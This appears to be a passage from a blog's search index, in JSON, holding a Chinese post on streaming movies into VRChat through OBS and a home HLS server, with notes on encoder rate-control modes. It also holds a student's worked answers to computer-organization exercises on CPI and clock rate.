<li>\u65e0\u6cd5\u968f\u65f6\u8c03\u8282\u89c6\u9891\u7801\u7387\u3002\u7531\u4e8e\u64ad\u653e\u5668\u662f\u76f4\u63a5\u8bf7\u6c42\u89c6\u9891\u6587\u4ef6\uff0c\u56e0\u6b64\u5bf9\u7f51\u7edc\u5e26\u5bbd\u6709\u5f88\u9ad8\u8981\u6c42\u3002\u5bf9\u4e8e\u4e0b\u8f7d\u7684\u7801\u7387\u5f88\u9ad8\u7684\u7535\u5f71\u6587\u4ef6\uff0c\u76f4\u63a5\u64ad\u653e\u57fa\u672c\u4e0a\u662f\u4e0d\u53ef\u80fd\u7684\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u5982\u4eca\u5404\u79cd\u4e91\u76d8\u4e3a\u4e86\u63d0\u4f9b\u5728\u7ebf\u64ad\u653e\u529f\u80fd\uff0c\u4f1a\u5bf9\u7528\u6237\u4e0a\u4f20\u7684\u89c6\u9891\u8fdb\u884c\u8f6c\u7801\uff0c\u4fdd\u5b58 480p, 720p, 1080p \u7b49\u4e0d\u540c\u5206\u8fa8\u7387\u6e05\u6670\u5ea6\u7684\u7248\u672c\u3002\u800c\u76f4\u64ad\u4e0d\u540c\uff0c\u76f4\u64ad\u6e90\u53ef\u4ee5\u968f\u65f6\u8c03\u8282\u7801\u7387</li> </ul> </li> </ul> <p>\u76f4\u64ad\u94fe\u63a5</p> <ul> <li>\u4f18\u70b9<ul> <li>\u517c\u5bb9\u6027\u6700\u597d\uff0c\u7531\u4e8e\u76f4\u63a5\u4e32\u6d41\u7535\u8111\u753b\u9762\uff0c\u56e0\u6b64\u4f7f\u7528\u7535\u8111\u4e0a\u7684\u64ad\u653e\u5668\u57fa\u672c\u53ef\u4ee5\u64ad\u653e\u4efb\u610f\u89c6\u9891\u6587\u4ef6\uff0c\u5b57\u5e55\u5207\u6362\u3001\u591a\u97f3\u8f68\u90fd\u4e0d\u662f\u95ee\u9898\u3002</li> <li>\u6309\u9700\u8c03\u8282\u7801\u7387</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>VRC \u4e2d\u65e0\u6cd5\u968f\u65f6\u8c03\u8282\u64ad\u653e\u8fdb\u5ea6\uff0c\u9700\u8981\u7535\u8111\u4e0a\u64cd\u4f5c</li> <li>\u753b\u8d28\u4e0d\u5982\u539f\u59cb\u89c6\u9891\u6587\u4ef6\u3002\u76f4\u64ad\u5176\u5b9e\u662f\u5728\u5bf9\u753b\u9762\u8fdb\u884c\u5b9e\u65f6\u7f16\u7801\uff0c\u901a\u5e38\u4f7f\u7528\u6838\u663e\u6216\u8005\u72ec\u663e\u52a0\u901f\u3002\u800c\u538b\u5236\u7ec4\u538b\u5236\u7684\u89c6\u9891\u8d44\u6e90\u662f\u4f7f\u7528 CPU \u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u538b\u51fa\u6765\u7684\uff0c\u4f1a\u5bf9\u5404\u79cd\u53c2\u6570\u8fdb\u884c\u8c03\u8282\uff0c\u4e8c\u8005\u8d28\u91cf\u4e0a\u80af\u5b9a\u662f\u540e\u8005\u66f4\u9ad8\u3002\u800c\u4e14\u76f4\u64ad\u901a\u5e38\u91c7\u7528 CBR\uff08\u56fa\u5b9a\u7801\u7387\uff09 \u6216\u8005 VBR\uff08\u53ef\u53d8\u7801\u7387\uff09\u7f16\u7801\u65b9\u5f0f\u3002\u4f18\u5316\u7684\u662f\u7801\u7387\uff0c\u800c\u4e0d\u662f\u753b\u8d28\uff0c\u56e0\u6b64\u753b\u8d28\u4e5f\u662f\u4e0d\u5982\u4f7f\u7528 CRF\uff08Constant Rate Factor\uff09\u538b\u51fa\u6765\u7684\u9ad8\u7801\u7387\u89c6\u9891\u3002<ul> <li>\u4f46\u662f\u5176\u5b9e\u53ea\u8981\u629b\u5f03\u753b\u8d28\u6709\u635f\u5931\u8fd9\u6837\u7684\u60f3\u6cd5\uff0c\u76f4\u64ad\u7f16\u7801\u51fa\u6765\u7684\u753b\u9762\u662f\u8db3\u591f\u89c2\u770b\u7535\u5f71\u7684\u3002</li> </ul> </li> </ul> </li> </ul>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#\u65b9\u6848\u4ecb\u7ecd","title":"\u65b9\u6848\u4ecb\u7ecd","text":"<p>\u6700\u540e\u7ecf\u8fc7\u7814\u7a76\uff0c\u56f4\u7ed5 VRChat \u786e\u5b9e\u6709\u8bb8\u591a\u65b9\u6848\u3002\u6700\u7b80\u5355\u7684\uff0c\u4f7f\u7528 twitch \u76f4\u64ad\u7535\u8111\u753b\u9762\uff0c\u5f53\u7136\u540c\u6837\u4f1a\u9047\u5230\u7801\u7387\u9650\u5236\u7b49\u95ee\u9898\u3002\u6240\u4ee5\u6700\u597d\u7684\u8fd8\u662f\u5229\u7528\u81ea\u5df1\u7684\u4e0a\u4f20\u5e26\u5bbd\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728\u5bb6\u5bbd\u4e0a\u642d\u5efa\u4e00\u4e2a HLS \u7684\u670d\u52a1\u5668\u3002\u7ed1\u5b9a\u57df\u540d\uff0c\u63d0\u4f9b\u7ed9\u5916\u7f51\u8bbf\u95ee\u3002\u53ef\u4ee5\u4f7f\u7528 OBS \u5c06\u7535\u8111\u5c4f\u5e55\u3001\u89c6\u9891\u64ad\u653e\u5668\u7b49\u753b\u9762\u63a8\u6d41\u5230\u81ea\u5df1\u7684 HLS \u670d\u52a1\u5668\u4e0a\u3002</p> <ul> <li>\u4f18\u70b9<ul> <li>\u80fd\u591f\u64ad\u653e\u81ea\u5df1\u4e0b\u8f7d\u7684\u5185\u5bb9\uff0c\u4e0d\u9700\u8981\u7ecf\u8fc7\u7f51\u76d8</li> <li>\u57fa\u672c\u4e0d\u4f1a\u5b58\u5728\u89c6\u9891\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u56e0\u4e3a\u63a8\u6d41\u7684\u662f\u7535\u8111\u753b\u9762</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u56fd\u5185\u53ef\u80fd\u6709\u6cd5\u5f8b\u95ee\u9898\uff1f\u76f8\u5f53\u4e8e\u5728\u5bb6\u5bbd\u4e0a\u642d\u5efa\u76f4\u64ad\u670d\u52a1\u5668</li> <li>\u4e0a\u4f20\u5e26\u5bbd\u53d7\u9650\uff08\u56fd\u5185\u5bb6\u5bbd\u76ee\u524d\u4e0a\u884c\u666e\u904d\u53ea\u670920-40Mbps \u6c34\u5e73\uff09\uff0c\u6309\u7167 2.5Mbps \u7684\u7801\u7387\uff0c\u6700\u591a\u53ea\u80fd 10 \u4eba\u540c\u65f6\u89c2\u770b\u3002\u60f3\u8981 8Mbps \u7801\u7387\uff0c\u5c31\u53ea\u80fd 4 \u4eba\u89c2\u770b\u4e86\u3002</li> <li>\u6ca1\u6709 cdn \u4f18\u5316\uff0c\u4e0d\u4e00\u5b9a\u6bcf\u4e2a\u5730\u65b9\u90fd\u6709\u5f88\u597d\u7684\u64ad\u653e\u4f53\u9a8c</li> </ul> </li> </ul>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#obs--hls-\u670d\u52a1\u5668--vrc-\u65b9\u6848","title":"OBS + HLS \u670d\u52a1\u5668 + VRC \u65b9\u6848","text":"<p>\u65b9\u6848\u53d8\u5316</p> <p>\u5176\u5b9e\u6211\u539f\u672c\u60f3\u7684\u662f\u4f7f\u7528 ffmpeg \u5c06\u89c6\u9891\u8f6c\u7801\u540e\u63a8\u9001\u5230 HLS \u670d\u52a1\u5668\u3002\u5e76\u4e14\u5728\u514b\u670d\u4e00\u5927\u5806\u95ee\u9898\u5982\u97f3\u9891\u683c\u5f0f\u3001\u5b57\u5e55\u95ee\u9898\u540e\u7ec8\u4e8e\u5b9e\u73b0\u4e86\u53ef\u7528\u7684 ffmpeg \u547d\u4ee4\u884c\u53c2\u6570\u3002\u7136\u540e\u5728\u5199\u8fd9\u7bc7\u535a\u5ba2\u65f6\u7a81\u7136\u5728 github \u4e0a\u627e\u5230\u4e86\u4e00\u4e2a 2019 \u5e74\u7684\u4ed3\u5e93\u4ecb\u7ecd\u4f7f\u7528 VRC \u57fa\u4e8e HLS \u6765\u89c2\u770b\u89c6\u9891\u7684\u65b9\u6848\u3002\u65b9\u6848\u91cc\u7528\u7684 OBS \u8fdb\u884c\u63a8\u6d41\uff0c\u6211\u624d\u610f\u8bc6\u5230 OBS \u201c\u706b\u7bad\u201d\u90fd\u9020\u597d\u4e86\uff0c\u6211\u4e3a\u5565\u8981\u7528 ffmpeg \u5728\u8fd9\u9020\u81ea\u884c\u8f66\u5462:)</p> <p>\u7531\u4e8e mekanoe/VRC_HLS: Solution &amp; guide for streaming anything into VRChat. (github.com) \u89e3\u91ca\u7684\u5f88\u8be6\u7ec6\u4e86\uff0c\u56e0\u6b64\u8fd9\u91cc\u5c31\u4e0d\u518d\u8be6\u7ec6\u89e3\u91ca\u4e86\u3002</p>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#h264_nvenc-\u6a21\u5f0f\u9009\u62e9","title":"h264_nvenc \u6a21\u5f0f\u9009\u62e9","text":"<ul> <li>CBR (Constant Bit Rate)<ul> <li>\u6052\u5b9a\u6bd4\u7279\u7387\uff1a\u5728\u6574\u4e2a\u89c6\u9891\u7f16\u7801\u8fc7\u7a0b\u4e2d\uff0c\u7801\u7387\u4fdd\u6301\u6052\u5b9a\u3002</li> <li>\u7279\u70b9<ul> <li>\u4fdd\u6301\u7a33\u5b9a\u7684\u7801\u7387\uff0c\u5e26\u5bbd\u5229\u7528\u7387\u53ef\u9884\u6d4b\u3002</li> <li>\u9002\u7528\u4e8e\u5e26\u5bbd\u9650\u5236\u4e25\u683c\u7684\u73af\u5883\uff0c\u5982\u76f4\u64ad\u3002</li> <li>\u53ef\u80fd\u5bfc\u81f4\u5728\u590d\u6742\u573a\u666f\u4e2d\u753b\u8d28\u4e0b\u964d\uff0c\u56e0\u4e3a\u7801\u7387\u4e0d\u4f1a\u52a8\u6001\u8c03\u6574\u3002</li> </ul> </li> <li>\u4f7f\u7528\u573a\u666f\uff1a<ul> <li>\u76f4\u64ad\uff1a\u7531\u4e8e\u76f4\u64ad\u901a\u5e38\u9700\u8981\u7a33\u5b9a\u7684\u7801\u7387\u6765\u4fdd\u8bc1\u6d41\u7545\u4f20\u8f93\uff0cCBR \u662f\u6700\u4f73\u9009\u62e9\u3002</li> </ul> </li> </ul> </li> <li>CQP (Constant QP)\uff1a\u6052\u5b9a\u91cf\u5316\u53c2\u6570\uff1a\u4e0d\u63a7\u5236\u6bd4\u7279\u7387\uff0c\u800c\u662f\u63a7\u5236\u91cf\u5316\u53c2\u6570\uff08QP\uff09\uff0c\u4ee5\u4fdd\u6301\u6052\u5b9a\u7684\u89c6\u89c9\u8d28\u91cf\u3002<ul> <li>\u7279\u70b9\uff1a<ul> <li>\u8d28\u91cf\u6052\u5b9a\uff0c\u7801\u7387\u6839\u636e\u5185\u5bb9\u590d\u6742\u5ea6\u53d8\u5316\u3002</li> <li>\u9ad8\u8d28\u91cf\u7f16\u7801\uff0c\u4f46\u65e0\u6cd5\u9884\u6d4b\u8f93\u51fa\u6587\u4ef6\u5927\u5c0f\u6216\u5e26\u5bbd\u9700\u6c42\u3002</li> <li>\u4e0d\u9002\u5408\u5b9e\u65f6\u4f20\u8f93\u6216\u5e26\u5bbd\u53d7\u9650\u573a\u666f\u3002</li> </ul> </li> <li>\u4f7f\u7528\u573a\u666f\uff1a<ul> <li>\u672c\u5730\u5b58\u50a8\uff1a\u9002\u7528\u4e8e\u9700\u8981\u9ad8\u8d28\u91cf\u7f16\u7801\u7684\u573a\u666f\uff0c\u5982\u89c6\u9891\u5b58\u6863\u6216\u540e\u671f\u5904\u7406\u3002</li> </ul> </li> </ul> </li> <li>VBR (Variable Bit Rate)<ul> <li>\u53ef\u53d8\u6bd4\u7279\u7387\uff1a\u5141\u8bb8\u6bd4\u7279\u7387\u6839\u636e\u89c6\u9891\u5185\u5bb9\u7684\u590d\u6742\u5ea6\u52a8\u6001\u8c03\u6574\uff0c\u5728\u7b80\u5355\u573a\u666f\u4e2d\u964d\u4f4e\u7801\u7387\uff0c\u5728\u590d\u6742\u573a\u666f\u4e2d\u589e\u52a0\u7801\u7387\u3002</li> <li>\u7279\u70b9\uff1a<ul> <li>\u8d28\u91cf\u4e0e\u6587\u4ef6\u5927\u5c0f\u4e4b\u95f4\u7684\u5e73\u8861\u3002</li> <li>\u63d0\u9ad8\u89c6\u9891\u590d\u6742\u573a\u666f\u7684\u753b\u8d28\uff0c\u540c\u65f6\u5728\u7b80\u5355\u573a\u666f\u4e2d\u8282\u7701\u5e26\u5bbd\u3002</li> <li>\u9002\u5408\u5e26\u5bbd\u76f8\u5bf9\u5bbd\u677e\u4f46\u5e0c\u671b\u4f18\u5316\u4f20\u8f93\u8d28\u91cf\u7684\u573a\u666f\u3002</li> </ul> </li> <li>\u4f7f\u7528\u573a\u666f\uff1a<ul> <li>\u9884\u5f55\u89c6\u9891\uff1a\u9002\u7528\u4e8e\u5e0c\u671b\u4f18\u5316\u6587\u4ef6\u5927\u5c0f\u548c\u753b\u8d28\u7684\u89c6\u9891\u5f55\u5236\u3002</li> </ul> </li> </ul> </li> </ul>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#\u7801\u7387\u8bbe\u7f6e","title":"\u7801\u7387\u8bbe\u7f6e","text":"<p>Choose live encoder settings, bitrates, and resolutions - YouTube Help (google.com)</p> <p></p> <p>1080p@60 \u63a8\u8350 12 Mbps</p>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#vrc-\u5730\u56fe","title":"VRC \u5730\u56fe","text":"<p>\u63a8\u8350\u6765\u81eaThe Best Ways To Watch Movies in VR (with friends) for Free! \u2013 VR Wave (vr-wave.store)</p>","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#movie--chill","title":"Movie &amp; Chill","text":"","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#yet-another-movie-theater-renewed","title":"Yet Another Movie Theater: Renewed","text":"","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#sovrens-chill-home","title":"Sovren\u2019s Chill Home","text":"","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#campsite-movie-night","title":"Campsite Movie Night","text":"","tags":["vr","vrchat","hls"]},{"location":"%E5%8D%9A%E5%AE%A2/2024/05/25/VR%20%E5%A4%9A%E4%BA%BA%E8%A7%82%E5%BD%B1%E6%96%B9%E6%A1%88%E6%8E%A2%E7%A9%B6/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>VRC player allowlist\uff1a Video Player Allowlist | VRChat Creation</li> <li>Fluid\uff0c\u53ef\u4ee5\u5728\u5404\u4e2a\u5730\u65b9\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u4e5f\u652f\u6301\u591a\u4eba\u6a21\u5f0f: Fluid</li> <li>\u63a8\u8350\u4e86\u5404\u79cd VR \u89c2\u5f71\u65b9\u6848\uff0c\u4ee5\u53ca VRC \u5730\u56fe\uff1aThe Best Ways To Watch Movies in VR (with friends) for Free! \u2013 VR Wave (vr-wave.store)<ul> <li>\u5176\u5b83\u65b9\u6848<ul> <li>Horizon Words</li> <li>Watch Party - Meta Horizon Home</li> </ul> </li> </ul> </li> <li>VRC + HLS \u6559\u7a0b\uff1amekanoe/VRC_HLS: Solution &amp; guide for streaming anything into VRChat. (github.com)</li> <li>streaming \u53cb\u597d ffmpeg \u7f16\u7801\u9009\u9879<ul> <li>faststart\uff1a\u89c6\u9891\u53ef\u4ee5\u7acb\u5373\u64ad\u653e\uff0c\u800c\u4e0d\u662f\u7b49\u5230\u6587\u4ef6\u4e0b\u8f7d\u7ed3\u675f\u3002Fastest way to add -movflags +faststart to an MP4 using FFMPEG, leaving everything else as-is - Stack Overflow</li> <li>\u5176\u5b83\u5de5\u5177\u8fd8\u652f\u6301 interlaving audio and video: Fragmentation, segmentation, splitting and interleaving \u00b7 gpac/gpac Wiki (github.com)</li> </ul> </li> <li>\u652f\u6301 3d \u89c6\u9891\u7684\u64ad\u653e\u5668\uff1f\uff1aProTV 2.3 for VRChat (Udon Video Player) [Free DL available] (gumroad.com)</li> <li>USharpVideo\u662f\u524d\u7aef\uff0c\u540e\u7aef\u57fa\u4e8e AVPro ?AVPro Only \u00b7 MerlinVR/USharpVideo Wiki (github.com)</li> </ul> <pre><code>public VRCUnityVideoPlayer unityVideo;\npublic VRCAVProVideoPlayer avProVideo;\n</code></pre>","tags":["vr","vrchat","hls"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406 \u7b2c\u4e00\u7ae0\u4f5c\u4e1a","text":"<p>\u6559\u6750\uff1a\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\uff1a\u8f6f\u786c\u4ef6\u63a5\u53e3 \u7b2c 5 \u7248 (mips \u7248) \u65f6\u95f4\uff1a2019/09/08</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-12","title":"Exercise 1.2","text":"<ol> <li>a: \"Assembly lines in automobile manufacturing\" -&gt; \"Performance via Pipelining\"</li> <li>b: \"Suspension bridge cables\" -&gt; \u201cDependability via Redundancy\u201d</li> <li>c: \"Aircraft and marine navigation systems that incorporate wind information\" -&gt; \u201cPerformance via Prediction\u201d</li> <li>d: \"Express elevators in buildings\" -&gt; \u201cPerformance via Parallelism\u201d</li> <li>e: \"Library reserve desk\" -&gt; \u201cHierarchy of Memories\u201d</li> <li>f: \"Increasing the gate area on a CMOS transistor to decrease its switching time\" -&gt; \u201cMake the Common Case Fast\u201d</li> <li>g: \"Adding electromagnetic aircraft catapults (which are electrically-powered as opposed to current steam-powered models), allowed by the increased power generation off ered by the new reactor technology\" -&gt; \u201cDesign for Moore\u2019s Law\u201d</li> <li>h: \"Building self-driving cars whose control systems partially rely on existing sensor systems already installed into the base veh icle, such as lane departure systems and smart cruise control systems\" -&gt; \u201cUse Abstraction to Simplify Design\u201d</li> </ol>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-13","title":"Exercise 1.3","text":"<p>\u4ee5 C \u8bed\u8a00\u4e3a\u4f8b\uff1a \u2003\u2003\u2003\u2003\u7f16\u8bd1\u2003\u2003\u2003\u2003\u2003\u6c47\u7f16\u2003\u2003\u2003\u2003\u2003\u2003\u94fe\u63a5 $ \u6e90\u4ee3\u7801 \\Longrightarrow \u6c47\u7f16\u8bed\u8a00 \\Longrightarrow \u76ee\u6807\u4ee3\u7801 \\Longrightarrow \u673a\u5668\u4ee3\u7801$</p> <ul> <li>\u7f16\u8bd1\uff1a\u901a\u8fc7\u7f16\u8bd1\u5668\uff0c\u8bfb\u53d6\u6e90\u7a0b\u5e8f\uff08\u5b57\u7b26\u6d41\uff09\uff0c\u5bf9\u4e4b\u8fdb\u884c\u8bcd\u6cd5\u548c\u8bed\u6cd5\u7684\u5206\u6790\uff0c\u5c06\u9ad8\u7ea7\u8bed\u8a00\u6307\u4ee4\u8f6c\u6362\u4e3a\u529f\u80fd\u7b49\u6548\u7684\u6c47\u7f16\u4ee3\u7801\u7684\u8fc7\u7a0b\u3002</li> <li>\u6c47\u7f16\uff1a\u901a\u8fc7\u6c47\u7f16\u5668\u5c06\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\u7ffb\u8bd1\u6210\u76ee\u6807\u673a\u5668\u6307\u4ee4\u7684\u8fc7\u7a0b\u3002</li> <li>\u94fe\u63a5\uff1a\u5c06\u6709\u5173\u7684\u76ee\u6807\u6587\u4ef6\u5f7c\u6b64\u76f8\u8fde\u63a5\uff0c\u4e5f\u5373\u5c06\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5f15\u7528\u7684\u7b26\u53f7\u540c\u8be5\u7b26\u53f7\u5728\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\u8fde\u63a5\u8d77\u6765\uff0c\u4f7f\u5f97\u6240\u6709\u7684\u8fd9\u4e9b\u76ee\u6807\u6587\u4ef6\u6210\u4e3a\u4e00\u4e2a\u80fd\u591f\u88ab\u64cd\u4f5c\u7cfb\u7edf\u88c5\u5165\u6267\u884c\u7684\u7edf\u4e00\u6574\u4f53\u3002</li> </ul>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-14","title":"Exercise 1.4","text":"<p>a) $ frame size = 1280 \\times 1024 \\times 3 \\times 8bit = 3.75MB $ b) $ time = \\frac{ 1280 \\times 1024 \\times 3 \\times 8bit }{100 \\times 10^{6} bit} \\approx 0.31s $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-15","title":"Exercise 1.5","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#151","title":"1.5.1","text":"<p>\u8bbe\\(I\\)\u4e3a\u6307\u4ee4\u6570\uff0c\\(t\\)\u4e3a cpu \u6267\u884c\u65f6\u95f4\uff0c\\(f\\)\u4e3a\u65f6\u949f\u9891\u7387\uff0c\u5219\uff1a $$     I = \\frac{t \\cdot f}{CPI} $$ $ I_{p1} = {1 \\times 3 \\over 1.5} = 2G \u6761$ $ I_{p2} = {1 \\times 2.5 \\over 1} = 2.5G \u6761$ $ I_{p3} = {1 \\times 4 \\over 2.2} \\approx 1.82G \u6761$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#152","title":"1.5.2","text":"<p>\u8bbe$ C $\u4e3a\u65f6\u949f\u6570\uff0c\u5219\uff1a</p> <p>$ C_{p1} = 10 \\times 3 = 30G $ $ I_{p1} = {30 \\over 1.5} = 20G $</p> <p>$ C_{p2} = 10 \\times 2.5 = 25G $ $ I_{p2} = {25 \\over 1} = 25G $</p> <p>$ C_{p3} = 10 \\times 4 = 40G $ $ I_{p3} = {40 \\over 2.2} \\approx 18.2G $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#153","title":"1.5.3","text":"<p>(1) $ t = \\frac{I \\cdot CPI}{f} $ (2) $ (1-0.3)t = \\frac{I \\cdot (1+0.2)CPI}{f'} $</p> <p>$ \u7531\\frac{(1)}{(2)} \\Rightarrow \\frac{clock rate'}{clock rate} = {(1+0.2) \\over (1-0.3)} = 1.71$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-16","title":"Exercise 1.6","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#161","title":"1.6.1","text":"<p>\u4ee4$ p_i $\u4e3a\u4e00\u6761\u6307\u4ee4\u5360\u603b\u6307\u4ee4\u7684\u6bd4\u4f8b\uff0c\u5219\u5bf9\u4e8e\u5e73\u5747 CPI\uff0c\u6709\uff1a $$     \\overline {CPI} = \\sum_{i=1}^nCPI_i \\cdot p_i $$ \u5bf9\u4e8e P1\uff1a$ \\overline {CPI} = 0.1\\times 1 + 0.2\\times 2 + 0.5\\times 3 + 0.2\\times 3 = 2.5 $ \u5bf9\u4e8e P2\uff1a$ \\overline {CPI} = 2 $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#162","title":"1.6.2","text":"<p>\u5bf9\u4e8e P1\uff0c\u65f6\u949f\u6570\uff1a$ C = \\frac{1.0 \\times 10^6}{2.5} = 4\\times 10^5 $ \u5bf9\u4e8e P2\uff0c\u65f6\u949f\u6570\uff1a$ C = \\frac{1.0 \\times 10^6}{2} = 5\\times 10^5 $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-17","title":"Exercise 1.7","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#a","title":"a)","text":"<p>\u8bbe$ T \\(\u4e3a\u65f6\u949f\u5468\u671f\uff0c\\) t \\(\u4e3a\u7a0b\u5e8f\u6267\u884c\u65f6\u95f4\uff0c\\) I $\u4e3a\u6307\u4ee4\u6570\uff0c\u5219\uff1a $$     CPI = \\frac{t}{I \\cdot T} $$ $ \\overline {CPI_A} = \\frac{1.1s}{1.0 \\times 10^9 \\times 1 ns} = 1.1$ $ \\overline {CPI_B} = \\frac{1.5s}{1.2 \\times 10^9 \\times 1 ns} = 